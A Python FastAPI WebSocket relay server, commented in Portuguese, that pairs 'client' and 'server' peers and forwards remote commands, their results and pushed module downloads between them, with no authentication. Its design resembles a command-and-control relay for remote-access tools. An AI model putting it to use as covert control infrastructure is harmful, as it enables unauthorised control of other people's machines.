from fastapi import FastAPI, WebSocket, WebSocketDisconnect, HTTPException
from fastapi.responses import JSONResponse
from typing import Dict, Any, Optional
from pydantic import BaseModel
import json
import asyncio
import time
import logging

app = FastAPI(title="TLS Hybrid Relay API", version="1.0.0")

# Configuração de logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

class PeerInfo(BaseModel):
    peer_id: str
    role: str  # "client" ou "server"
    client_info: Optional[Dict] = None

class PeerConnection:
    def __init__(self, websocket: WebSocket, role: str, client_info: Dict = None):
        self.websocket = websocket
        self.role = role
        self.client_info = client_info or {}
        self.partner: Optional[str] = None
        self.last_ping = time.time()
        self.active = True

# Armazena conexões ativas
peers: Dict[str, PeerConnection] = {}
servers: Dict[str, PeerConnection] = {}
clients: Dict[str, PeerConnection] = {}

@app.websocket("/ws/{peer_id}/{role}")
async def websocket_endpoint(websocket: WebSocket, peer_id: str, role: str):
    await websocket.accept()
    logger.info(f"Nova conexão: {peer_id} como {role}")
    
    # Cria conexão
    connection = PeerConnection(websocket, role)
    peers[peer_id] = connection
    
    if role == "server":
        servers[peer_id] = connection
    elif role == "client":
        clients[peer_id] = connection
    
    try:
        while connection.active:
            # Recebe mensagem
            data = await websocket.receive_text()
            message = json.loads(data)
            
            # Processa mensagem
            await handle_message(peer_id, message, connection)
            
    except WebSocketDisconnect:
        logger.info(f"Cliente {peer_id} desconectado")
    except Exception as e:
        logger.error(f"Erro na conexão {peer_id}: {e}")
    finally:
        # Limpa conexão
        await cleanup_connection(peer_id)

async def handle_message(peer_id: str, message: Dict, connection: PeerConnection):
    """Processa mensagens recebidas"""
    msg_type = message.get("type", "")
    
    if msg_type == "identify":
        # Cliente se identificando
        connection.client_info = message.get("info", {})
        logger.info(f"Cliente {peer_id} identificado: {connection.client_info}")
        
        # Tenta conectar com servidor disponível
        await auto_connect_to_server(peer_id)
        
    elif msg_type == "ping":
        # Atualiza timestamp e responde
        connection.last_ping = time.time()
        await connection.websocket.send_text(json.dumps({
            "type": "pong",
            "timestamp": time.time()
        }))
        
    elif msg_type == "command":
        # Comando do servidor para cliente
        if connection.role == "server" and connection.partner:
            partner = peers.get(connection.partner)
            if partner and partner.active:
                await partner.websocket.send_text(json.dumps(message))
        
    elif msg_type == "command_result":
        # Resultado de comando do cliente para servidor
        if connection.role == "client" and connection.partner:
            partner = peers.get(connection.partner)
            if partner and partner.active:
                await partner.websocket.send_text(json.dumps(message))
    
    elif msg_type == "module_download":
        # Servidor enviando módulo para cliente
        if connection.role == "server" and connection.partner:
            partner = peers.get(connection.partner)
            if partner and partner.active:
                await partner.websocket.send_text(json.dumps(message))
    
    elif msg_type in ["module_success", "module_error"]:
        # Resposta de instalação de módulo
        if connection.role == "client" and connection.partner:
            partner = peers.get(connection.partner)
            if partner and partner.active:
                await partner.websocket.send_text(json.dumps(message))

async def auto_connect_to_server(client_id: str):
    """Conecta automaticamente cliente com servidor disponível"""
    if not servers:
        logger.warning(f"Nenhum servidor disponível para cliente {client_id}")
        return
    
    # Pega primeiro servidor disponível sem parceiro
    for server_id, server_conn in servers.items():
        if server_conn.partner is None and server_conn.active:
            # Estabelece conexão
            clients[client_id].partner = server_id
            servers[server_id].partner = client_id
            
            # Notifica ambos sobre a conexão
            await notify_connection_established(client_id, server_id)
            logger.info(f"Auto-conectado: cliente {client_id} <-> servidor {server_id}")
            return
    
    logger.warning(f"Nenhum servidor disponível para cliente {client_id}")

async def notify_connection_established(client_id: str, server_id: str):
    """Notifica cliente e servidor sobre conexão estabelecida"""
    client = clients.get(client_id)
    server = servers.get(server_id)
    
    if client and client.active:
        await client.websocket.send_text(json.dumps({
            "type": "connected",
            "partner": server_id,
            "partner_role": "server"
        }))
    
    if server and server.active:
        await server.websocket.send_text(json.dumps({
            "type": "client_connected",
            "partner": client_id,
            "client_info": client.client_info if client else {}
        }))

async def cleanup_connection(peer_id: str):
    """Limpa conexão desconectada"""
    if peer_id in peers:
        connection = peers[peer_id]
        
        # Se tinha parceiro, desconecta
        if connection.partner:
            partner = peers.get(connection.partner)
            if partner:
                partner.partner = None
                if partner.active:
                    await partner.websocket.send_text(json.dumps({
                        "type": "partner_disconnected",
                        "partner_id": peer_id
                    }))
        
        # Remove das listas
        peers.pop(peer_id, None)
        servers.pop(peer_id, None)
        clients.pop(peer_id, None)

@app.post("/relay/connect")
async def manual_connect_relay(peer_a: str, peer_b: str):
    """Conecta manualmente dois peers"""
    if peer_a not in peers or peer_b not in peers:
        raise HTTPException(status_code=404, detail="Um ou ambos peers não encontrados")
    
    # Liga os peers para relay
    peers[peer_a].partner = peer_b
    peers[peer_b].partner = peer_a
    
    return {"status": "relay established", "peers": [peer_a, peer_b]}

@app.post("/relay/disconnect")
async def disconnect_relay(peer_id: str):
    """Desconecta um peer do relay"""
    if peer_id not in peers:
        raise HTTPException(status_code=404, detail="Peer não encontrado")
    
    connection = peers[peer_id]
    partner_id = connection.partner
    
    if partner_id and partner_id in peers:
        peers[partner_id].partner = None
        connection.partner = None
    
    return {"status": "disconnected", "peer": peer_id}

@app.get("/peers")
def list_peers():
    """Lista todos os peers conectados"""
    peer_list = []
    for peer_id, connection in peers.items():
        peer_list.append({
            "id": peer_id,
            "role": connection.role,
            "partner": connection.partner,
            "client_info": connection.client_info,
            "last_ping": connection.last_ping,
            "active": connection.active
        })
    
    return {
        "total_peers": len(peers),
        "servers": len(servers),
        "clients": len(clients),
        "peers": peer_list
    }

@app.get("/status")
def get_status():
    """Status geral do relay"""
    active_connections = sum(1 for p in peers.values() if p.active)
    
    return {
        "status": "active",
        "total_connections": len(peers),
        "active_connections": active_connections,
        "servers": len(servers),
        "clients": len(clients),
        "paired_connections": sum(1 for p in peers.values() if p.partner is not None)
    }

# Tarefa em background para limpeza de conexões inativas
async def cleanup_inactive_connections():
    """Remove conexões inativas (sem ping há mais de 2 minutos)"""
    while True:
        await asyncio.sleep(60)  # Verifica a cada minuto
        
        current_time = time.time()
        inactive_peers = []
        
        for peer_id, connection in peers.items():
            if current_time - connection.last_ping > 120:  # 2 minutos
                inactive_peers.append(peer_id)
        
        for peer_id in inactive_peers:
            logger.info(f"Removendo conexão inativa: {peer_id}")
            await cleanup_connection(peer_id)

# Inicia tarefa de limpeza
@app.on_event("startup")
async def startup_event():
    asyncio.create_task(cleanup_inactive_connections())

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)